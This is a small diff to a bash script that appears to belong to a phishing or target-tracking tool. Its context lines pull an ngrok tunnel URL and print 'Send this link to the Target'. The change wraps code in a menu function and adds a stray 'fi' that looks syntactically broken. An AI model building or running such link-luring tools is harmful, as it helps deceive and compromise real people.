@@ -334,7 +334,7 @@ link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $link
 checkfound
 }
-
+menu () {
 start1() {
 printf "\n"
 #printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net \e[0m\n"
@@ -376,7 +376,9 @@ echo -e "\e[1;32m"
 toilet -f  mono12 Target  | lolcat
 
 echo -e "\e[1;34m Created By @sparkz_technology \e[1;31m              v6.sparkz"
-
+menu
+fi
+}
 
 dependencies
 start1
